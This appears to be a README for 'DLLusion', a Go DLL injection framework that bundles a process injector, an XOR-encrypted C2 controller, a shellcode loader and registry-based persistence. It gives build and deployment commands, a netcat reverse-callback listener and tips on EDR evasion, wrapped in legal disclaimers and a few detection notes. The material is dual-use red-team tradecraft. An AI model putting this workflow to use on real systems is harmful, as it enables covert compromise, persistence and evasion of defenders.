# DLL Injection Framework 🔒⚙️

DLLusion is a controlled experimental DLL injection framework written in golang for studying Windows process injection techniques, defensive evasion methods, and post-exploitation tradecraft in authorized security research environments.


## 🚧 Active Development Notice

This project is currently under active development and should be considered:
- Experimental - May contain unstable code
- Research-grade - Not production-ready
- Volatile - APIs may change without notice

Current Development Focus:
✓ EDR evasion improvements
✓ Cross-architecture support
✓ Operational security enhancements
✓ Defensive countermeasure research

**WARNING: This project is for educational and research purposes only. Misuse of this software may violate local, national, and international laws. The developers assume no liability and are not responsible for any misuse or damage caused by this tool.**


## ⚠️ Critical Disclaimer ⚠️

This software is provided "as-is" without any guarantees of functionality or safety. 
It demonstrates advanced security concepts related to:
- Process injection techniques
- Remote thread creation
- Defensive evasion methods
- Post-exploitation workflows

NEVER use this tool on systems without explicit written permission from the system owner. 
Unauthorized use may constitute illegal computer intrusion under laws including but not limited to:
- US Computer Fraud and Abuse Act (CFAA)
- UK Computer Misuse Act
- EU Directive 2013/40/EU


## 🔧 Technical Overview
Architecture:
```bash
DLLusion/
├── build/
│   ├── windows/             # Target: Compromised Windows machine
│   │   ├── injected.dll     # Malicious DLL
│   │   └── injector.exe     # Injection tool
│   └── linux/               # Attacker: Linux machine
│       └── controller       # ELF binary (no .exe)
├── src/
│   ├── dll/                 # Windows DLL code
│   ├── injector/            # Windows injector
│   └── controller/          # Controller (cross-platform compatible)
├── scripts/
│   ├── build_dll.sh         # Builds Windows DLL
│   ├── build_injector.sh    # Builds Windows injector
│   ├── build_controller.sh  # Builds Linux ELF or Windows EXE
│   └── generate_shellcode.sh # Generates a .bin shellcode 
├── go.mod 					 # Go module file
└── README.md                # Project documentation
```

### Key Features
1. Process Injector => Advanced DLL injection using NT syscalls
2. Encrypted C2 	=> XOR-encrypted TCP communication
3. Shellcode Loader => In-memory execution with RX permissions
4. Persistence Module => Registry-based autorun installation

### 🛠️ Installation Requirements
```bash

# Development Environment
sudo apt install golang mingw-w64 metasploit-framework

# Security Restrictions
chmod 700 build_*.sh        # Limit script access
ulimit -n 2048              # Prevent resource exhaustion
```

## 🛠️ Usage Instructions (Authorized Testing Only)
Prerequisites:
✔ Written authorization for testing
✔ Isolated lab environment (VM recommended)
✔ Kali Linux or similar security distro
✔ Go 1.20+ and mingw-w64 installed

Step 1: Configuration
```bash

# Clone the repository securely
git clone https://your-repo-url/dllusion.git --config core.hooksPath=.githooks

cd dllusion

```

Step 2: Build Components
```bash

# Generate encrypted shellcode (produces .bin and .key files)
./scripts/generate_shellcode.sh

# Build all components (Linux controller + Windows DLL/Injector)
./scripts/build_controller.sh
./scripts/build_dll.sh
./scripts/build_injector.sh

# Verify outputs
ls -lh build/{linux,windows}/
```

Expected output:

build/
├── linux/
│   ├── controller       # Linux C2 client
│   ├── shellcode.bin    # Encrypted payload
│   └── shellcode.key    # XOR decryption key
└── windows/
    ├── injected.dll     # Malicious DLL
    └── injector.exe     # Injection tool


Step 3: Deployment (Authorized Targets Only)

# On Windows target (Admin shell):
```powershell
.\injector.exe -pid 1337 -dll injected.dll
```
# On Linux attacker machine:
```bash
./build/linux/controller
```

Step 4: Verification
1. Check for callback on your listener:
```bash
   nc -lvnp 443
```

2. Verify DLL injection:
   Process Hacker/Process Explorer on target

3. Confirm persistence:
```powershell
   reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```
Step 5: Cleanup
``` powershell
# On Windows target:
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousApp /f

taskkill /PID 1337 /F

del injected.dll
```

 Operational Security Notes
🔐 Always use:
- VPN tunneling for C2 traffic
- Encrypted payloads (XOR + TLS)
- Process hollowing instead of direct injection where possible
- Time-delayed execution for evasion


## 🚀 Usage Guidelines

### Execution Protocol

1. Obtain written permission from system owner
2. Deploy in isolated network segment
3. Use process explorer to verify PID
4. Execute with explicit authorization:
	```bash
   $ injector.exe -pid 1337 -dll injected.dll
   ```
5. Immediately destroy artifacts post-test

### ⚖️ Legal & Compliance
Required Documentation:
- Signed testing agreement
- Incident response plan
- Data handling policy
- Destruction of artifacts certification

Regulatory Alignment:
This tool helps organizations comply with:
- NIST SP 800-53 (Security Controls)
- PCI DSS v4.0 (Penetration Testing)
- ISO 27001 (Risk Management)
When used properly by authorized professionals.

### 🔒 Security Best Practices
Risk Mitigation Strategies:
1. Network segmentation
2. Host-based firewall rules
3. Process whitelisting
4. Memory protection controls
5. Regular audits

Monitoring Recommendations
1. Sysmon configuration for injection detection
2. ETW-based thread creation monitoring
3. Kernel-mode hook detection


## 📄 License

AGPL-3.0 with Ethical Use Amendment:
This license strictly prohibits:
- Military applications
- Surveillance use
- Human rights violations
- Unauthorized penetration testing

By using this software, you agree to comply with all applicable laws and ethical guidelines.
